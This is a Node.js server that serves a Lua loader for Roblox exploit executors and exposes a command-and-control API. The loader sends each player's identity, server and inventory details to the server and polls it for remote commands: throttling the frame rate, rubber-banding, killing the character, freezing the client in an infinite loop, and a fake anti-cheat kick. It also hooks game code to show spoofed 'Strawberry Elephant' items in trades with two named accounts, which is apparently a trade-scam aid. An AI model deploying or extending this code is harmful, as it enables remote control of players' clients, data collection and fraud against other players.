const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const players = new Map();

app.get('/loader.lua', (req, res) => {
    const SERVER_BASE = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const loader = `--[[ Xeno Loader v3 – Robust ]]--
local BASE = "${SERVER_BASE}"
local KEY  = "xenooooo"

-- ─── HTTP request resolver ──────────────────────────────────
local genv = (getgenv and getgenv()) or _G or {}
local function resolveRequest()
    return http_request
        or request
        or (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or genv.http_request
        or genv.request
        or (genv.syn and genv.syn.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end
if not request then return end

-- ─── LocalPlayer ────────────────────────────────────────────
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local CollectionService = game:GetService("CollectionService")

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

-- ─── Heartbeat ──────────────────────────────────────────────
local function heartbeat()
    safe(function()
        request({
            Url = BASE .. "/api/public/heartbeat",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
            Body = HttpService:JSONEncode({
                user_id = LP.UserId,
                username = LP.Name,
                display_name = LP.DisplayName,
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png",
                place_id = game.PlaceId,
                game_name = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end) or "Unknown",
                job_id = game.JobId,
                executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
                server_players = (function() local t={} for _,p in pairs(Players:GetPlayers()) do t[#t+1]=p.Name end return t end)(),
                brainrots = (function()
                    local list = {}
                    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
                    if pg then
                        local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
                        if gui then
                            local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end)
                            if frame then
                                local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
                                if scroll then
                                    for _, template in ipairs(scroll:GetChildren()) do
                                        if template.Name == "Template" then
                                            local cash, title = nil, nil
                                            for _, obj in ipairs(template:GetDescendants()) do
                                                if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
                                                    local text = obj.Text
                                                    if string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "%$") or (string.match(text, "^%d+$") and tonumber(text) > 100) then
                                                        cash = text
                                                    end
                                                    if not string.match(text, "^%d+$") and not string.find(text, "Template") and not string.find(text, "Cookie") and not string.find(text, "Milki") and string.len(text) > 3 then
                                                        if not title or string.len(text) > string.len(title) then
                                                            title = text
                                                        end
                                                    end
                                                end
                                            end
                                            if cash or title then
                                                list[#list+1] = { title = title or "Unknown", cash = cash or "Unknown" }
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    return list
                end)(),
            }),
        })
    end)
end

-- ─── FPS Limiter ────────────────────────────────────────────
local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

-- ─── LAG-C (Carry) ──────────────────────────────────────────
local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    if mode == "carry" then return currentSpeed() >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    if Vector3.new(vel.X, 0, vel.Z).Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setLagCarry(on)
    if on == (mode == "carry") then return end
    if on then
        mode = "carry"
        isActive = true
        startLoop()
    else
        mode = nil
        isActive = false
        stopLoop()
    end
end

-- ─── Reset (kill) ──────────────────────────────────────────
local function resetPlayer()
    pcall(function()
        local char = LP.Character
        if char then
            local hum = char:FindFirstChild("Humanoid")
            if hum then hum.Health = 0 end
        end
    end)
end

-- ─── Ele Visual (protected) ──────────────────────────────
_G.EleVisualEnabled = false
_G.SpooferTargets = {}
_G.SpoofHooked = false

pcall(function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local targetNames = {
        ["Momo766884"] = true,
        ["Rocketguy8940"] = true
    }

    task.spawn(function()
        for name, _ in pairs(targetNames) do
            pcall(function()
                local id = Players:GetUserIdFromNameAsync(name)
                if id then _G.SpooferTargets[id] = true end
            end)
        end
    end)

    local function isTargetPlot(p1)
        local ownerId = p1.PlotModel and p1.PlotModel:GetAttribute("Owner")
        if ownerId and _G.SpooferTargets[ownerId] then return true end
        local owner = p1:GetOwner()
        if owner and targetNames[owner.Name] then return true end
        if p1.PlotModel then
            for _, desc in pairs(p1.PlotModel:GetDescendants()) do
                if desc:IsA("TextLabel") and desc.Text then
                    for name, _ in pairs(targetNames) do
                        if string.find(desc.Text, name) then return true end
                    end
                end
            end
        end
        return false
    end

    local PlotClient = require(ReplicatedStorage:WaitForChild("Classes"):WaitForChild("PlotClient"))
    local Animals2 = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
    local NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))

    if not _G.SpoofHooked then
        _G.SpoofHooked = true
        local function hookMethod(methodName)
            local oldMethod = PlotClient[methodName]
            if not oldMethod then return end
            PlotClient[methodName] = function(p1, p2, p3)
                if _G.EleVisualEnabled and isTargetPlot(p1) then
                    if p3 and p3.AnimalList and p3.AnimalList[p2] then
                        local oldData = p3.AnimalList[p2]
                        if type(oldData) == "table" and oldData.Index and oldData.Index ~= "Empty" then
                            local spoofedData = {}
                            for k, v in pairs(oldData) do spoofedData[k] = v end
                            spoofedData.Index = "Strawberry Elephant"
                            spoofedData.Traits = nil
                            spoofedData.Mutation = nil
                            p3.AnimalList[p2] = spoofedData
                            local ret = oldMethod(p1, p2, p3)
                            p3.AnimalList[p2] = oldData
                            return ret
                        end
                    end
                end
                return oldMethod(p1, p2, p3)
            end
        end
        hookMethod("UpdateModel")
        hookMethod("UpdatePrompt")
        hookMethod("UpdateClaim")
    end

    if hookmetamethod and getnamecallmethod and checkcaller then
        local oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if not checkcaller() and _G.EleVisualEnabled then
                if method == "GetAttribute" then
                    local attr = select(1, ...)
                    if attr == "__render_brainrot" or attr == "__render_mutation" or attr == "__render_traits" then
                        if typeof(self) == "Instance" and CollectionService:HasTag(self, "ClientRenderBrainrot") then
                            if attr == "__render_brainrot" then return "Strawberry Elephant" end
                            if attr == "__render_mutation" then return nil end
                            if attr == "__render_traits" then return "[]" end
                        end
                    end
                end
            end
            return oldNamecall(self, ...)
        end)
    end

    task.spawn(function()
        while true do
            if _G.EleVisualEnabled then
                pcall(function()
                    local duelsMachine = LP.PlayerGui:FindFirstChild("DuelsMachineSession")
                    if duelsMachine then
                        local mainSession = duelsMachine:FindFirstChild("DuelsMachineSession")
                        if mainSession then
                            local otherPanel = mainSession:FindFirstChild("Other")
                            if otherPanel then
                                local opponentIsTarget = false
                                for _, lbl in pairs(otherPanel:GetDescendants()) do
                                    if lbl:IsA("TextLabel") and lbl.Text then
                                        for name, _ in pairs(targetNames) do
                                            if string.find(lbl.Text, name) then
                                                opponentIsTarget = true
                                                break
                                            end
                                        end
                                    end
                                    if opponentIsTarget then break end
                                end
                                if opponentIsTarget then
                                    for _, item in pairs(otherPanel:GetChildren()) do
                                        if item.Name == "Item" then
                                            local realViewport = item:FindFirstChild("ViewportFrame")
                                            if realViewport then
                                                local hasRealModel = false
                                                for _, v in pairs(realViewport:GetChildren()) do
                                                    if v:IsA("Model") then hasRealModel = true; break end
                                                end
                                                local titleLbl = item:FindFirstChild("Title")
                                                local isTitleEmpty = false
                                                if titleLbl then
                                                    local t = titleLbl.Text
                                                    isTitleEmpty = (t == "Empty" or t == "Waiting..." or t == "None" or t == "")
                                                end
                                                if hasRealModel and not isTitleEmpty then
                                                    if titleLbl and titleLbl.Text ~= "Strawberry Elephant" then
                                                        titleLbl.Text = "Strawberry Elephant"
                                                    end
                                                    local cashLbl = item:FindFirstChild("Cash")
                                                    if cashLbl then
                                                        local gen = Animals2:GetGeneration("Strawberry Elephant", nil, {})
                                                        cashLbl.Text = ("$%*/s"):format(NumberUtils:ToString(gen))
                                                    end
                                                    local originalPos = realViewport:GetAttribute("OriginalPos")
                                                    if not originalPos then
                                                        originalPos = realViewport.Position
                                                        realViewport:SetAttribute("OriginalPos", originalPos)
                                                    end
                                                    realViewport.Visible = false
                                                    realViewport.Position = UDim2.new(10, 0, 10, 0)
                                                    local fakeViewport = item:FindFirstChild("FakeViewport")
                                                    if not fakeViewport then
                                                        fakeViewport = realViewport:Clone()
                                                        fakeViewport.Name = "FakeViewport"
                                                        fakeViewport.Position = originalPos
                                                        fakeViewport.Visible = true
                                                        fakeViewport.ZIndex = realViewport.ZIndex + 5
                                                        fakeViewport.Parent = item
                                                        pcall(function()
                                                            for _, v in pairs(fakeViewport:GetChildren()) do
                                                                if v:IsA("Model") or v:IsA("Camera") or v:IsA("ImageLabel") then
                                                                    v:Destroy()
                                                                end
                                                            end
                                                            Animals2:AttachOnViewportWithOptimizations("Strawberry Elephant", fakeViewport, nil, nil)
                                                        end)
                                                    end
                                                    if fakeViewport then fakeViewport.Visible = true end
                                                    local traits = item:FindFirstChild("Traits")
                                                    if traits then
                                                        for _, v in pairs(traits:GetChildren()) do
                                                            if v:IsA("ImageLabel") and v.Name ~= "Template" then
                                                                v.Visible = false
                                                            end
                                                        end
                                                    end
                                                else
                                                    local fakeViewport = item:FindFirstChild("FakeViewport")
                                                    if fakeViewport then fakeViewport.Visible = false end
                                                    local originalPos = realViewport:GetAttribute("OriginalPos")
                                                    if originalPos then
                                                        realViewport.Position = originalPos
                                                    end
                                                    realViewport.Visible = true
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
                pcall(function()
                    for _, p1 in pairs(CollectionService:GetTagged("ClientRenderBrainrot")) do
                        if p1:GetAttribute("__render_brainrot") ~= "Strawberry Elephant" then
                            CollectionService:RemoveTag(p1, "ClientRenderBrainrot")
                            p1:SetAttribute("__render_brainrot", "Strawberry Elephant")
                            p1:SetAttribute("__render_mutation", nil)
                            p1:SetAttribute("__render_traits", "[]")
                            CollectionService:AddTag(p1, "ClientRenderBrainrot")
                        end
                    end
                end)
            end
            task.wait(0.1)
        end
    end)
end)

-- ─── Poll ──────────────────────────────────────────────────
local kicked = false
local prevLagC = false
local prevFps = false
local prevEle = false

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantLagC = (data.lag_c == true)
    if wantLagC ~= prevLagC then
        prevLagC = wantLagC
        setLagCarry(wantLagC)
    end

    local wantEle = (data.ele_visual == true)
    if wantEle ~= prevEle then
        prevEle = wantEle
        _G.EleVisualEnabled = wantEle
    end

    if data.reset == true then
        resetPlayer()
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

-- ─── Start ──────────────────────────────────────────────────
heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ─── API routes (unchanged from previous) ──────────────────
app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit || false,
        lag_c: existing.lag_c || false,
        ele_visual: existing.ele_visual || false,
    });
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000;
    const REMOVE_THRESHOLD = 20 * 60 * 1000;
    for (const [id, p] of players.entries()) {
        const timeSinceLast = now - (p.lastHeartbeat || 0);
        if (timeSinceLast >= REMOVE_THRESHOLD) {
            players.delete(id);
            continue;
        }
        const online = timeSinceLast < OFFLINE_THRESHOLD;
        if (!online) {
            p.fps_limit = false;
            p.lag_c = false;
            p.ele_visual = false;
            p._kick = false;
            p._reset = false;
        }
        p.online = online;
        list.push({ ...p });
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_c: false, ele_visual: false });
    res.json({
        fps_limit: p.fps_limit || false,
        lag_c: p.lag_c || false,
        ele_visual: p.ele_visual || false,
    });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_c, ele_visual, kick, crash, reset } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (ele_visual !== undefined) p.ele_visual = !!ele_visual;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    if (reset === true) p._reset = true;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_c: false, ele_visual: false });
    const response = {
        fps_limit: p.fps_limit || false,
        lag_c: p.lag_c || false,
        ele_visual: p.ele_visual || false,
    };
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    if (p._reset) {
        response.reset = true;
        p._reset = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});